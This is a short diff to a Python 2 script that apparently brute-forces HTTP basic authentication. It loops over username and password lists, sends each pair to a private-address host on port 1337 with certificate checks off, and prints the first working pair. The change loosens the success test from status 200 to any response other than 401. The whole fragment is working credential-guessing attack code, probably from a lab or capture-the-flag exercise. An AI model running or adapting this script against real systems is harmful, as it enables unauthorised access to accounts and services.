@@ -13,6 +13,6 @@ with open('usernames') as f1:
 				r = requests.get('https://192.168.130.184:1337/', auth=(line1, line2), verify=False)
 				#without http, run the below uncomment the below code instead of the above one
 				#r = requests.get('https://192.168.130.184:1337/', auth=(line1, line2))
-                                if r.status_code == 200:
+                                if r.status_code != 401:
 					print "Found valid credentials \"" + line1 + ":" + line2 + "\""
 					raise sys.exit()
